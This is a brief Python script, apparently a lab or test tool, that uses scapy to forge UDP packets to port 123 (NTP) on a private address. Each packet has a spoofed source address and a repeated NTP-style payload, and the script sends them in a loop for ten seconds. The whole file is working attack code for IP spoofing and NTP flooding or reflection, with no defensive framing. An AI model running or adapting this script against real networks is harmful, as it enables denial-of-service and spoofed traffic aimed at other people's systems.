from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"
C= RandShort()
D= 123
E= "\x1b\x00\x03\x2a" * 12

start = time.time()
while (time.time() - start < 10):
    spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / E
    send(spoofed_packet)